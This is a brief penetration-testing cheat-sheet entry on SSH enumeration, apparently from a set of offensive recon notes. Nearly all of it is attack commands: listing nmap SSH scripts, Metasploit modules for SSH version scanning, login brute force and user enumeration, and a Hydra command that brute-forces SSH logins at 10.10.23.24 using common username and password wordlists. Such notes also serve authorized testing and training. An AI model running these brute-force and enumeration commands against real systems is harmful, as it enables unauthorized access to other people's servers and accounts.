---
title: SSH Enumeration
category: recon
subcategory: service-enum
os: linux
command: hydra -L users -P pass target ssh
tools: nmap, msfconsole, hydra
---


### Nmap scripts

```bash
ls -al /usr/share/nmap/scripts/ | grep ssh-*
```

### Metasploit

```bash
search type:auxiliary name:ssh
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_enumusers
```

### Hydra bruteforce

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 10.10.23.24 -t 4 ssh
```
